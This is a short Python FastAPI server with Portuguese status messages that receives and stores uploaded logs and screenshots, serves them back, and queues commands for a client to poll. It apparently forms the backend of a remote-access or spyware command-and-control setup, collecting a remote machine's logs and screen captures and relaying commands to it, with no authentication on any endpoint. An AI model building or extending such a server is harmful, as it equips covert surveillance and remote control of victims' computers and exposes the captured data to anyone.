from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import FileResponse, JSONResponse
import json, os

app = FastAPI()

@app.post("/upload_log")
async def upload_log(file: UploadFile = File(...)):
    content = await file.read()
    with open("log_received.json", "wb") as f:
        f.write(content)
    return {"status": "log recebido"}

@app.post("/upload_screen")
async def upload_screen(file: UploadFile = File(...)):
    content = await file.read()
    with open("screen_received.jpg", "wb") as f:
        f.write(content)
    return {"status": "screenshot recebida"}

@app.get("/logs")
def get_logs():
    if os.path.exists("log_received.json"):
        with open("log_received.json", "r") as f:
            data = json.load(f)
        return JSONResponse(content=data)
    return {"status": "sem logs"}

@app.get("/screen")
def get_screen():
    if os.path.exists("screen_received.jpg"):
        return FileResponse("screen_received.jpg", media_type="image/jpeg")
    return {"status": "sem imagem"}

@app.post("/command")
async def post_command(request: Request):
    data = await request.json()
    with open("command.json", "w") as f:
        json.dump(data, f)
    return {"status": "comando recebido"}

@app.get("/command")
def get_command():
    if os.path.exists("command.json"):
        with open("command.json") as f:
            return json.load(f)
    return {"command": ""}